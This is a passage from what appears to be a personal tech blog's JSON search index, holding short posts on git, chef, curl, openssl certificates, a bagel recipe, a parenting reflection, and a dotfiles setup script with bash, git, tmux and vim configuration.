them.\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-14-guard_clause/","summary":"guard clauses Because I did not know the term for this, a guard clause is essentially a check if not null or similar empty set checks in code\u0026hellip; example for ruby is return [] if instances.empty? Filling in holes of knowledge and writing them down becaue otherwise I may not retain them.","title":"2018-02-14 guard_clause"},{"content":"cargo cult programming Cargo cult programming is a style of computer programming characterized by the ritual inclusion of code or program structures that serve no real purpose Cargo_cult_programming\nShotgun debugging: A process of making relatively un-directed changes to software in the hope that a bug will be perturbed out of existence. Shotgun_debugging\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-15-cargo_culting/","summary":"cargo cult programming Cargo cult programming is a style of computer programming characterized by the ritual inclusion of code or program structures that serve no real purpose Cargo_cult_programming\nShotgun debugging: A process of making relatively un-directed changes to software in the hope that a bug will be perturbed out of existence. Shotgun_debugging","title":"2018-02-15 cargo_culting "},{"content":"git revert Yey more git. I am still not the greatest at git, therefore here is the step by step on how to revert a PR/merge from git.\nfirst checkout the master branch: Git checkout master then run a git log and get the id of the merge commit. git log then revert to that commit: git revert -m 1 \u0026lt;merge-commit\u0026gt; With ‘-m 1’ we tell git to revert to the first parent of the mergecommit on the master branch. -m 2 would specify to revert to the first parent on the develop branch where the merge came from initially.\nNow commit the revert and push changes to the remote repo and you are done.\nGetting back the reverted changes This changes the data to look like before the merge, but not the history. So it’s not exactly like an undo. If we would merge develop into master again the changes we reverted in master wont be applied. So if we would like these changes back again we could revert our first revert(!).\ngit revert \u0026lt;commit-of-first-revert\u0026gt;\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-19-git_revert/","summary":"git revert Yey more git. I am still not the greatest at git, therefore here is the step by step on how to revert a PR/merge from git.\nfirst checkout the master branch: Git checkout master then run a git log and get the id of the merge commit. git log then revert to that commit: git revert -m 1 \u0026lt;merge-commit\u0026gt; With ‘-m 1’ we tell git to revert to the first parent of the mergecommit on the master branch.","title":"2018-02-19 git_revert "},{"content":"Firefox Alright chrome has been using a ton of battery on my mac so I am going back to firefox. Supposedly firefox is much better on the battery than chrome. We will give this a try and see if it ends up working.\nMeaningless words here we are again trying to make the daily blogging work, lets see if it sticks better now. It is pretty tough to do now that there is a baby at home and I only have so much time for my own projects. I am quickly learning that anything I want to do is going to have to happen after the kiddo goes to bed.\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-20-firefox_bs/","summary":"Firefox Alright chrome has been using a ton of battery on my mac so I am going back to firefox. Supposedly firefox is much better on the battery than chrome. We will give this a try and see if it ends up working.\nMeaningless words here we are again trying to make the daily blogging work, lets see if it sticks better now. It is pretty tough to do now that there is a baby at home and I only have so much time for my own projects.","title":"2018-02-20 firefox_bs "},{"content":"Mp3 i wanted to find the bitrate on a file in the terminal and i found this bashrc function\u0026hellip;\necho `basename \u0026#34;$1\u0026#34;`: `file \u0026#34;$1\u0026#34; | sed \u0026#39;s/.*, \\(.*\\)kbps.*/\\1/\u0026#39; | tr -d \u0026#34; \u0026#34; ` kbps } ","permalink":"https://ridingintraffic.github.io/posts/2018-02-22-mp3_bitrate/","summary":"Mp3 i wanted to find the bitrate on a file in the terminal and i found this bashrc function\u0026hellip;\necho `basename \u0026#34;$1\u0026#34;`: `file \u0026#34;$1\u0026#34; | sed \u0026#39;s/.*, \\(.*\\)kbps.*/\\1/\u0026#39; | tr -d \u0026#34; \u0026#34; ` kbps } ","title":"2018-02-20 mp3_bitrate "},{"content":"git i am bad at git, here is my attempt at rebase and cleaning up git rebase -i ; where the commit hash is the one before yours the reword all of hte commits except for your latest one, the latest one you pick then check the git log to make sure that you only have one commit finally on your feature branch to a git push --force which will force your local into the branch you are working on and hopefully everything will get squashed\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-26-git_is_hard/","summary":"git i am bad at git, here is my attempt at rebase and cleaning up git rebase -i ; where the commit hash is the one before yours the reword all of hte commits except for your latest one, the latest one you pick then check the git log to make sure that you only have one commit finally on your feature branch to a git push --force which will force your local into the branch you are working on and hopefully everything will get squashed","title":"2018-02-26 git is hard "},{"content":"shasum Getting a shasum on something\u0026hellip; useful so lets do it with this shasum -a 256 \u0026lt;filename\u0026gt;\nmastering markdown n Now if only i could keep all of this in my head mastering-markdown\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-27-shasum_markdown/","summary":"shasum Getting a shasum on something\u0026hellip; useful so lets do it with this shasum -a 256 \u0026lt;filename\u0026gt;\nmastering markdown n Now if only i could keep all of this in my head mastering-markdown","title":"2018-02-27 shasum_markdown"},{"content":"git gc git gc .. while useful can be pretty nasty. Make sure that you don\u0026rsquo;t do a git gc --prune=now unless you really want to clean out your repos. git gc Runs a number of housekeeping tasks within the current repository, such as compressing file revisions (to reduce disk space and increase performance) and removing unreachable objects which may have been created from prior invocations of git add.\n","permalink":"https://ridingintraffic.github.io/posts/2018-02-28-git_gc/","summary":"git gc git gc .. while useful can be pretty nasty. Make sure that you don\u0026rsquo;t do a git gc --prune=now unless you really want to clean out your repos. git gc Runs a number of housekeeping tasks within the current repository, such as compressing file revisions (to reduce disk space and increase performance) and removing unreachable objects which may have been created from prior invocations of git add.","title":"2018-02-28 git gc"},{"content":"Writing go in vim It is pretty useful if you are writing go in vim to have this added to your vimrc au BufWritePost *.go !gofmt -w % It will auto format your go files to make sure they don\u0026rsquo;t suck. This is super important as I am crappy at formatting.\n","permalink":"https://ridingintraffic.github.io/posts/2018-03-06-go-things/","summary":"Writing go in vim It is pretty useful if you are writing go in vim to have this added to your vimrc au BufWritePost *.go !gofmt -w % It will auto format your go files to make sure they don\u0026rsquo;t suck. This is super important as I am crappy at formatting.","title":"2018-03-06 go-things"},{"content":"gitignore notes there is a bunch of idfferent ways to ignore files in git.. gitignore\n","permalink":"https://ridingintraffic.github.io/posts/2018-03-13-gitignore_notes/","summary":"gitignore notes there is a bunch of idfferent ways to ignore files in git.. gitignore","title":"2018-03-13 gitignore notes"},{"content":"Solve a problem by not working on it. It’s 3:30 am standing holding my daughter, my t-shirt has puke on it from the 7pm feeding.\nDaughter finally falls asleep I hand her off to my wife. And go to sleep. But can’t sleep. That thing that happened earlier the day before and all those other things the week before. They crept into my head and I’m wide awake 4:00, 4:30, 5:00, all roll by and I’m wallowing in it.\nCrap I can’t sleep this is horrible that was horrible all of this is horrible.\nIt’s sooo easy to keep piling on the horrible instead of just not.\nJust looking at it differently. Change your perspective. Be flexible. Shake things up and look at it upside down.\nSure I’m not sleeping now, but I got some sleep, and the baby is asleep.\nInstead of wallowing in bed mourning the inability to accomplish something. Get out of bed go work out. Start actually doing something that betters the situation. I’m not sleeping but I am solving a different problem, and I am bettering myself in the process.\nIt may not be the thing that was bothering me or the root of situation. But move on to another problem. Now I have all this time before work to myself to work out to think and to write. The glass is now half full, it is a simple flip but at least I can go through the day tired and already worked out, than just tired.\nCool, I’ve got a few hours to get stuff done instead of ruminate on all the bullshit from before. Maybe I can solve one of those problems from before instead of just stewing on it. This may not always work and may not work for every problem but instead of piling onto the problems or wallowing in the inability to solve one, drop it, move on to something else and get back to that other problem some other time. Changing the scenery and letting the brain background process might actually result in a solution to that other problem. Or it can mean getting something else done in the process. Either way it is pretty win win.\nWhile inevitably you will need to sleep sometime, This type of problem solving I have found to be incredibly beneficial elsewhere. If I am stuck on a problem for too long my mind focuses too hard on everything that I have done before, I get into a “blinders” situation where I can’t see any other solutions and the problem become insurmountable. Let it rest let it steep and come back to it with a fresh set of eyes. The solution may present itself, if it doesn’t well at least something else was accomplished in the process.\n","permalink":"https://ridingintraffic.github.io/posts/2018-03-14-solve_problem_not_working/","summary":"Solve a problem by not working on it. It’s 3:30 am standing holding my daughter, my t-shirt has puke on it from the 7pm feeding.\nDaughter finally falls asleep I hand her off to my wife. And go to sleep. But can’t sleep. That thing that happened earlier the day before and all those other things the week before. They crept into my head and I’m wide awake 4:00, 4:30, 5:00, all roll by and I’m wallowing in it.","title":"2018-03-14 problems"},{"content":"ansible notes https://galaxy.ansible.com/ Galaxy is your hub for finding, reusing and sharing Ansible content\nhttps://github.com/wilmardo/ansible-role-plex repo for the plex install with ansible\u0026hellip; something for later\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-20-ansible/","summary":"ansible notes https://galaxy.ansible.com/ Galaxy is your hub for finding, reusing and sharing Ansible content\nhttps://github.com/wilmardo/ansible-role-plex repo for the plex install with ansible\u0026hellip; something for later","title":"ansible"},{"content":"I love bagel and egg sandwiches and they are super easy to make with almost no cleanup.\nBagel and egg sandwich the easy way(almost NO cleanup):\nas learned from watching a local bagel shop do it for a couple years. heat pan i think its a 12 or 16\u0026quot;, melt butter/oil to coat even nonstick pan while pan is heating take bowl, crack two eggs and whip them together - add whatever spices you want, I usually add nothing once pan is sizzling (if you toss a drop of water in it it sizzles) pour in bowl of eggs toast bagel let cook until it is just about no longer runny, take a decently big spatula fold egg in half, and then fold into quarter, press down, cook one side until it is done enough for you then flip. once flipped add the cheese of your choice until melted then transfer to bagel as the bagel should now be done toasting and hot. using the same pan add the meat of choice if thats your jam, ham/peperoni works well. heat, transfer, eat, profit\nCooking this meal this way will mean that the messiest cleanup will be the bowl that you mixed the eggs in. The pan, once oiled/buttered should leave almost nothing behind, unlike scrambled eggs which are a nightmare to clean up.\nEnjoy!! ","permalink":"https://ridingintraffic.github.io/posts/2022-05-24-bagel-sandwich-the-easy-way/","summary":"I love bagel and egg sandwiches and they are super easy to make with almost no cleanup.\nBagel and egg sandwich the easy way(almost NO cleanup):\nas learned from watching a local bagel shop do it for a couple years. heat pan i think its a 12 or 16\u0026quot;, melt butter/oil to coat even nonstick pan while pan is heating take bowl, crack two eggs and whip them together - add whatever spices you want, I usually add nothing once pan is sizzling (if you toss a drop of water in it it sizzles) pour in bowl of eggs toast bagel let cook until it is just about no longer runny, take a decently big spatula fold egg in half, and then fold into quarter, press down, cook one side until it is done enough for you then flip.","title":"bagel sandwich the easy way"},{"content":"self signed certs Genning certs is always a pita, luckily I found a quick and easy way from the folks over at spiderlabs, to do it.. gen-self-signed-cert.sh\n#!/bin/bash openssl genrsa -out my.key 2048 openssl req -new -x509 -days 3650 -key my.key -out my.crt -subj \u0026#34;/\u0026#34; ","permalink":"https://ridingintraffic.github.io/posts/2019-02-12-certs/","summary":"self signed certs Genning certs is always a pita, luckily I found a quick and easy way from the folks over at spiderlabs, to do it.. gen-self-signed-cert.sh\n#!/bin/bash openssl genrsa -out my.key 2048 openssl req -new -x509 -days 3650 -key my.key -out my.crt -subj \u0026#34;/\u0026#34; ","title":"certs"},{"content":"chef notes $ kitchen list $ kitchen converge ;# creates the vagrant box from the kitchen.yml $ kitchen exec -c whoami ;#fire a command from insid ethe vagrant box $ kitchen verify ;# runs the tests that are configured $ kitchen login ; # logs into the box directly gives a shell ","permalink":"https://ridingintraffic.github.io/posts/2016-02-19-chef/","summary":"chef notes $ kitchen list $ kitchen converge ;# creates the vagrant box from the kitchen.yml $ kitchen exec -c whoami ;#fire a command from insid ethe vagrant box $ kitchen verify ;# runs the tests that are configured $ kitchen login ; # logs into the box directly gives a shell ","title":"chef"},{"content":"chef notes $ kitchen list $ kitchen converge ;# creates the vagrant box from the kitchen.yml $ kitchen exec -c whoami ;#fire a command from insid ethe vagrant box $ kitchen verify ;# runs the tests that are configured $ kitchen login ; # logs into the box directly gives a shell ","permalink":"https://ridingintraffic.github.io/posts/2018-02-19-chef-notes/","summary":"chef notes $ kitchen list $ kitchen converge ;# creates the vagrant box from the kitchen.yml $ kitchen exec -c whoami ;#fire a command from insid ethe vagrant box $ kitchen verify ;# runs the tests that are configured $ kitchen login ; # logs into the box directly gives a shell ","title":"chef notes"},{"content":"shasum Getting a shasum on something\u0026hellip; useful so lets do it with this shasum -a 256 \u0026lt;filename\u0026gt;\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-27-cli/","summary":"shasum Getting a shasum on something\u0026hellip; useful so lets do it with this shasum -a 256 \u0026lt;filename\u0026gt;","title":"cli"},{"content":"curl redirects Sometimes you want to be able to follow a redirect chain to see what is going on. you can do that pretty easily with curl. Toss in your url and hit enter then follow the breadcrumbs.\ncurl -v -L http://google.com 2\u0026gt;\u0026amp;1 | egrep \u0026#34;^\u0026gt; (Host:|GET)\u0026#34; $ curl -v -L http://google.com 2\u0026gt;\u0026amp;1 | egrep \u0026#34;^\u0026gt; (Host:|GET)\u0026#34; \u0026gt; GET http://google.com/ HTTP/1.1 \u0026gt; Host: google.com \u0026gt; GET http://www.google.com/ HTTP/1.1 \u0026gt; Host: www.google.com ","permalink":"https://ridingintraffic.github.io/posts/2019-05-01-curl-redirects/","summary":"curl redirects Sometimes you want to be able to follow a redirect chain to see what is going on. you can do that pretty easily with curl. Toss in your url and hit enter then follow the breadcrumbs.\ncurl -v -L http://google.com 2\u0026gt;\u0026amp;1 | egrep \u0026#34;^\u0026gt; (Host:|GET)\u0026#34; $ curl -v -L http://google.com 2\u0026gt;\u0026amp;1 | egrep \u0026#34;^\u0026gt; (Host:|GET)\u0026#34; \u0026gt; GET http://google.com/ HTTP/1.1 \u0026gt; Host: google.com \u0026gt; GET http://www.google.com/ HTTP/1.1 \u0026gt; Host: www.","title":"curl redirects"},{"content":"dot file automation Sharpen and clean your tools to make them last longer. Hone your tools to make them more precise. The tools of a SRE start with the terminal. The terminal is honed sharp with dotfiles.\nLive your life long enough in a terminal and tweaks and customizations happen. Live longer and when those tweaks are lost from a catastrophe or when you switch machines, you will be hamstrung and saddened going back to nothing.\nPhase 1: maintain my dot files for tmux, bash, git and vim in a GitHub repo, and then manually symlink from the repo to my home directory.\nPhase 2: automate all of the configuration setup process and the supporting software.\nComplexity 1: half a dozen machines.\nComplexity 2: the machines were split between Mac and linux.\nComplexity 3: a couple of the linux VMs, want to be run as root. -Rage note about root- These are kali and security distributions that are not meant to be long lived, but I will be on the long enough to want a toolset.\nThe dot files are arranged in a shell script that will be run and then the proper bash git tmux and vim files are symlinked and used based on the os and the user that I am running as.\nIf there is anything that I’ve done horribly wrong with these I would really like to hear about it, these are the dot files that I have dragged around and revised for the past 5 years now or so, and we all know that looking t anything that was written even 6 months ago, we can think of way better ways of doing things.\nLet’s dive right in.\n#!/bin/bash #..setup.sh . double dots because gist, gets auto sorted (ugh) # Hi im a penguin if [ \u0026#34;Linux\u0026#34; = \u0026#34;$(uname -a | awk \u0026#39;{printf $1}\u0026#39;)\u0026#34; ] then # this is handled is submodoules #git clone https://github.com/magicmonty/bash-git-prompt.git ~/.bash-git-prompt --depth=1 #create symlinks #root because kali if [ \u0026#34;root\u0026#34; = \u0026#34;$(whoami)\u0026#34; ] then ln -s \u0026#34;$(pwd)\u0026#34;/.tmux.conf /\u0026#34;$(whoami)\u0026#34;/.tmux.conf ln -s \u0026#34;$(pwd)\u0026#34;/.vimrc /\u0026#34;$(whoami)\u0026#34;/.vimrc ln -s \u0026#34;$(pwd)\u0026#34;/.bashrc /\u0026#34;$(whoami)\u0026#34;/.bashrc ln -s \u0026#34;$(pwd)\u0026#34;/.gitconfig /\u0026#34;$(whoami)\u0026#34;/.gitconfig #not root like a sane person else ln -s \u0026#34;$(pwd)\u0026#34;/.tmux.conf /home/\u0026#34;$(whoami)\u0026#34;/.tmux.conf ln -s \u0026#34;$(pwd)\u0026#34;/.vimrc /home/\u0026#34;$(whoami)\u0026#34;/.vimrc ln -s \u0026#34;$(pwd)\u0026#34;/.bashrc /home/\u0026#34;$(whoami)\u0026#34;/.bashrc ln -s \u0026#34;$(pwd)\u0026#34;/.gitconfig /home/\u0026#34;$(whoami)\u0026#34;/.gitconfig fi #install latest ripgrep rg_tag=$(curl --silent \u0026#34;https://api.github.com/repos/BurntSushi/ripgrep/releases/latest\u0026#34; |grep \u0026#39;\u0026#34;tag_name\u0026#34;:\u0026#39; | sed -E \u0026#39;s/.*\u0026#34;([^\u0026#34;]+)\u0026#34;.*/\\1/\u0026#39; ) curl -LO https://github.com/BurntSushi/ripgrep/releases/download/\u0026#34;$rg_tag\u0026#34;/ripgrep_\u0026#34;$rg_tag\u0026#34;_amd64.deb sudo dpkg -i ripgrep_\u0026#34;$rg_tag\u0026#34;_amd64.deb rm ripgrep_\u0026#34;$rg_tag\u0026#34;_amd64.deb fi # hi I\u0026#39;m a mac if [ \u0026#34;Mac\u0026#34; = \u0026#34;$(sw_vers|grep ProductName |awk \u0026#39;{printf $2}\u0026#39;)\u0026#34; ] then ln -s \u0026#34;$(pwd)\u0026#34;/.tmux.conf /Users/\u0026#34;$(whoami)\u0026#34;/.tmux.conf ln -s \u0026#34;$(pwd)\u0026#34;/.vimrc /Users/\u0026#34;$(whoami)\u0026#34;/.vimrc ln -s \u0026#34;$(pwd)\u0026#34;/.bash_profile /Users/\u0026#34;$(whoami)\u0026#34;/.bash_profile ln -s \u0026#34;$(pwd)\u0026#34;/.gitconfig /Users/\u0026#34;$(whoami)\u0026#34;/.gitconfig brew install ripgrep brew install ranger fi mkdir -p ~/.vim/autoload ~/.vim/bundle \u0026amp;\u0026amp; \\ curl -LSso ~/.vim/autoload/pathogen.vim https://tpo.pe/pathogen.vim #bash_profile GIT_PROMPT_ONLY_IN_REPO=1 source ~/.bash-git-prompt/gitprompt.sh export PATH=/usr/local/sbin:/usr/local/bin:$PATH export PATH=\u0026#34;/Users/$(whoami)/platform-tools/:/usr/local/opt/python/libexec/bin:$PATH\u0026#34; export PATH=~/.local/bin:$PATH alias gpox=\u0026#39;git push origin `git rev-parse --abbrev-ref HEAD`\u0026#39; alias weather=\u0026#34;curl wttr.in/\u0026lt;your city\u0026gt;\u0026#34; alias docker_logs_latest=\u0026#34;docker logs -f \u0026#34;$(docker ps -l -q)\u0026#34; \u0026#34; ## a quick way to get out of current directory ## alias ..=\u0026#39;cd ..\u0026#39; alias ...=\u0026#39;cd ../../../\u0026#39; alias ....=\u0026#39;cd ../../../../\u0026#39; alias .....=\u0026#39;cd ../../../../\u0026#39; alias .4=\u0026#39;cd ../../../../\u0026#39; alias .5=\u0026#39;cd ../../../../..\u0026#39; alias vi=vim alias ping=\u0026#39;ping -c 5\u0026#39; #.bashrc # things for git GIT_PROMPT_ONLY_IN_REPO=1 source ~/.bash-git-prompt/gitprompt.sh alias gpox=\u0026#39;git push origin `git rev-parse --abbrev-ref HEAD`\u0026#39; # If not running interactively, don\u0026#39;t do anything case $- in *i*) ;; *) return;; esac # don\u0026#39;t put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL=ignoreboth # append to the history file, don\u0026#39;t overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE=1000 HISTFILESIZE=2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern \u0026#34;**\u0026#34; used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x /usr/bin/lesspipe ] \u0026amp;\u0026amp; eval \u0026#34;$(SHELL=/bin/sh lesspipe)\u0026#34; # set variable identifying the chroot you work in (used in the prompt below) if [ -z \u0026#34;${debian_chroot:-}\u0026#34; ] \u0026amp;\u0026amp; [ -r /etc/debian_chroot ]; then debian_chroot=$(cat /etc/debian_chroot) fi # set a fancy prompt (non-color, unless we know we \u0026#34;want\u0026#34; color) case \u0026#34;$TERM\u0026#34; in xterm-color|*-256color) color_prompt=yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt=yes if [ -n \u0026#34;$force_color_prompt\u0026#34; ]; then if [ -x /usr/bin/tput ] \u0026amp;\u0026amp; tput setaf 1 \u0026gt;\u0026amp;/dev/null; then # We have color support; assume it\u0026#39;s compliant with Ecma-48 # (ISO/IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt=yes else color_prompt= fi fi if [ \u0026#34;$color_prompt\u0026#34; = yes ]; then PS1=\u0026#39;${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ \u0026#39; else PS1=\u0026#39;${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ \u0026#39; fi unset color_prompt force_color_prompt # If this is an xterm set the title to user@host:dir case \u0026#34;$TERM\u0026#34; in xterm*|rxvt*) PS1=\u0026#34;\\[\\e]0;${debian_chroot:+($debian_chroot)}\\u@\\h: \\w\\a\\]$PS1\u0026#34; ;; *) ;; esac # enable color support of ls and also add handy aliases if [ -x /usr/bin/dircolors ]; then test -r ~/.dircolors \u0026amp;\u0026amp; eval \u0026#34;$(dircolors -b ~/.dircolors)\u0026#34; || eval \u0026#34;$(dircolors -b)\u0026#34; alias ls=\u0026#39;ls --color=auto\u0026#39; #alias dir=\u0026#39;dir --color=auto\u0026#39; #alias vdir=\u0026#39;vdir --color=auto\u0026#39; alias grep=\u0026#39;grep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; fi # some more ls aliases alias ll=\u0026#39;ls -alF\u0026#39; alias la=\u0026#39;ls -A\u0026#39; alias l=\u0026#39;ls -CF\u0026#39; # Add an \u0026#34;alert\u0026#34; alias for long running commands. Use like so: # sleep 10; alert alias alert=\u0026#39;notify-send --urgency=low -i \u0026#34;$([ $? = 0 ] \u0026amp;\u0026amp; echo terminal || echo error)\u0026#34; \u0026#34;$(history|tail -n1|sed -e \u0026#39;\\\u0026#39;\u0026#39;s/^\\s*[0-9]\\+\\s*//;s/[;\u0026amp;|]\\s*alert$//\u0026#39;\\\u0026#39;\u0026#39;)\u0026#34;\u0026#39; # Alias definitions. # You may want to put all your additions into a separate file like # ~/.bash_aliases, instead of adding them here directly. # See /usr/share/doc/bash-doc/examples in the bash-doc package. if [ -f ~/.bash_aliases ]; then . ~/.bash_aliases fi # enable programmable completion features (you don\u0026#39;t need to enable # this, if it\u0026#39;s already enabled in /etc/bash.bashrc and /etc/profile # sources /etc/bash.bashrc). if ! shopt -oq posix; then if [ -f /usr/share/bash-completion/bash_completion ]; then . /usr/share/bash-completion/bash_completion elif [ -f /etc/bash_completion ]; then . /etc/bash_completion fi fi #.gitconfig [alias] # abbreviations st = status -s ch = checkout co = commit br = branch # watch log watch = \u0026#34;!f() { while [ 1 ]; do clear; git log --all --oneline --decorate --graph; sleep 3; done; }; f\u0026#34; # pretty log with graph output lg = log --graph --pretty=format:\u0026#39;%C(yellow)%h%Cred -%C(auto)%d%Creset %s %Cgreen(%cr) %C(cyan)\u0026lt;%an\u0026gt;%Creset\u0026#39; --decorate --abbrev-commit --date=relative # pretty log file details ll = log --pretty=format:\u0026#39;%C(yellow)%h%Cred%d %Creset%s%Cblue [%cn]\u0026#39; --decorate --numstat # pretty log with dates ld = log --pretty=format:\u0026#39;%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s\u0026#39; --date=local # pretty log with dates, first parent only lf = log --pretty=format:\u0026#39;%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s\u0026#39; --date=local # prettier blame who = blame -c --show-stats --date=relative # prettier and concise whatchanged what = whatchanged --pretty=format:\u0026#39;%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s\u0026#39; --date=local --stat # prettier whatchanged with full diffs whatwhat = whatchanged --pretty=format:\u0026#39;%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s\u0026#39; --date=local -p # prettier whatchanged with full diffs based on text search whatwhen = whatchanged --pretty=format:\u0026#39;%C(yellow)%h %Cred%ad %Cblue%an%Cgreen%d %Creset%s\u0026#39; --date=local -p -S # search the log for when given text was introduced when = log -S # list of files that have changed (with status) changes = diff --name-status # list of files that have changed changed = diff --name-status # diff - ignore whitespace wdiff = diff -w # smart diff shows the changes that matter on a very granular level smartdiff = diff -w -b --patience # list of changes since current branch diverge from master branch mdiff = \u0026#34;!f() { git fetch; git diff origin/master...HEAD; }; f\u0026#34; # list of changes since current branch diverge from master branch - ignore whitespace mwdiff = \u0026#34;!f() { git fetch; git diff -w origin/master...HEAD; }; f\u0026#34; # list of files that have changed (with status) since current branch diverge from master branch mchanges = \u0026#34;!f() { git fetch; git diff --name-status origin/master...HEAD; }; f\u0026#34; # list of files that have changed since current branch diverge from master branch mchanged = \u0026#34;!f() { git fetch; git diff --name-only origin/master...HEAD; }; f\u0026#34; # diff between two branchs bdiff = \u0026#34;!f() { git diff $1...HEAD; }; f\u0026#34; # list of files that have changed (with status) between two branches bchanges = \u0026#34;!f() { git diff --name-status $1...HEAD; }; f\u0026#34; # list of files that have changed between two branches bchanged = \u0026#34;!f() { git diff --name-only $1...HEAD; }; f\u0026#34; # get diff between HEAD and origin/HEAD odiff = diff HEAD...origin/HEAD # get diff between HEAD and origin/HEAD ochanges = diff --name-status HEAD...origin/HEAD # find files f = \u0026#34;!git ls-files | grep -i\u0026#34; # find files containing text g = grep -Ii # find out which branch contains a change contains = branch --contains # pretty print all commits which were introduced by a given merge. NOTE: requires merge commit as an argument! introduced = \u0026#34;!f() { git log $(git merge-base --octopus $(git show $1 --format=\u0026#39;%P\u0026#39;))..$(git show $1 --format=\u0026#39;%H\u0026#39;) --boundary --graph --pretty=oneline --abbrev-commit; }; f\u0026#34; # used after a revert to show commands you\u0026#39;ll need to run in order to reintroduce commits previously introduced by a given merge commit. NOTE: requires merge commit as an argument! reintroduce = \u0026#34;!f() { git log $(git merge-base --octopus $(git show $1 --format=\u0026#39;%P\u0026#39;))..$(git show $1 --format=\u0026#39;%H\u0026#39;) --format=\u0026#39;git cherry-pick %H\u0026#39; --no-merges --reverse; }; f\u0026#34; # list branchs that exist on local only localonly = \u0026#34;!f() { LOCALS=$(git branch --list --no-color | cut -c 3-);REMOTES=$(git branch --all --no-color | grep \u0026#39;remotes/origin\u0026#39; | grep -v HEAD | awk -F\u0026#39;/\u0026#39; \u0026#39;{print $3}\u0026#39;);for R in $REMOTES; do LOCALS=$(echo \\\u0026#34;$LOCALS\\\u0026#34; | grep -v $R); done; echo \\\u0026#34;$LOCALS\\\u0026#34;; }; f\u0026#34; # leaderboard leaderboard = shortlog -s -n # hard reset hard = reset --hard # hard reset to HEAD hardhead = reset --hard HEAD # hard reset to first parent undo = reset --hard @^ # head commit head = rev-parse HEAD # head commit shorthead = rev-parse --short HEAD # cherry pick pick = cherry-pick -x # stash save = stash -u # stash pop pop = stash pop # copy given commit hash copy = \u0026#34;!f() { REF=${1:-HEAD}; git rev-parse --short $REF | tr -d \u0026#39;\\n\u0026#39; | pbcopy; }; f\u0026#34; # fixup commit fixup = !sh -c \u0026#39;git commit -m \\\u0026#34;fixup! $(git log -1 --format=\u0026#39;\\\\\u0026#39;\u0026#39;%s\u0026#39;\\\\\u0026#39;\u0026#39; $@)\\\u0026#34;\u0026#39; - # squash commit squash = !sh -c \u0026#39;git commit -m \\\u0026#34;squash! $(git log -1 --format=\u0026#39;\\\\\u0026#39;\u0026#39;%s\u0026#39;\\\\\u0026#39;\u0026#39; $@)\\\u0026#34;\u0026#39; - # interactive rebase ri = rebase --interactive --autosquash # svn update commit svnupdate = \u0026#34;!f() { svn update; git add -A; git commit -m \u0026#39;svn update\u0026#39;; }; f\u0026#34; # unapply stash stash-unapply = !git stash show -p --no-color | git apply -R # reset to guarenteed state goto = \u0026#34;!f() { git fetch; git reset --hard $1; git clean -d -f; }; f\u0026#34; # pull rebase pullr = pull --rebase # freebase freebase = \u0026#34;!f() { git fetch; git rebase `git remote show | head -1`/$1; }; f\u0026#34; # freeset freeset = \u0026#34;!f() { git fetch; git reset --hard `git remote show | head -1`/$1; }; f\u0026#34; #.gitmodules [submodule \u0026#34;.bash-git-prompt\u0026#34;] path = .bash-git-prompt url = git@github.com:magicmonty/bash-git-prompt.git [submodule \u0026#34;.vim/bundle/nerdtree\u0026#34;] path = .vim/bundle/nerdtree url = git@github.com:scrooloose/nerdtree.git [submodule \u0026#34;.vim/bundle/syntastic\u0026#34;] path = .vim/bundle/syntastic url = https://github.com/scrooloose/syntastic.git #.tmux.conf # color set -g default-terminal \u0026#34;xterm-256color\u0026#34; set -g status-fg white set -g status-bg black setw -g window-status-fg cyan setw -g window-status-bg default setw -g window-status-attr dim setw -g window-status-current-fg white setw -g window-status-current-bg red setw -g window-status-current-attr bright set -g pane-border-fg green set -g pane-border-bg black set -g pane-active-border-fg white set -g pane-active-border-bg yellow set -g message-fg white set -g message-bg black set -g message-attr bright set-option -g history-limit 100000 #vim stuff setw -g mode-keys vi bind -Tcopy-mode-vi \u0026#39;y\u0026#39; send -X copy-selection-and-cancel bind -Tcopy-mode-vi \u0026#39;y\u0026#39; send -X copy-pipe-and-cancel \u0026#34;reattach-to-user-namespace pbcopy\u0026#34; set-option -g mouse on # syncing sessions bind s setw synchronize-panes # window \u0026amp; pane control bind | split-window -h bind - split-window -v bind h select-pane -L bind j select-pane -D bind k select-pane -U bind l select-pane -R bind -r C-h select-window -t :- bind -r C-l select-window -t :+ bind K swap-pane -t 1 bind J swap-pane -t 2 bind L swap-pane -t 2 bind H swap-pane -t 1 bind b previous-window #home and end keys bind -n End send-key C-e bind -n Home send-key C-a set -g mode-keys vi # easily reload conf bind r source-file ~/.tmux.conf \\; display \u0026#34;Reloaded!\u0026#34; set-option -g default-command \u0026#34;/bin/bash -c \u0026#39;which reattach-to-user-namespace \u0026gt;/dev/null \u0026amp;\u0026amp; exec reattach-to-user-namespace $SHELL -l || exec $SHELL -l\u0026#39;\u0026#34; .vimrc syntax on filetype plugin indent on set nocompatible execute pathogen#infect() set statusline+=%#warningmsg# set statusline+=%* set laststatus=2 \u0026#34; [buffer number] followed by filename: set statusline+=[%n]\\ %F \u0026#34; for Syntastic messages: set 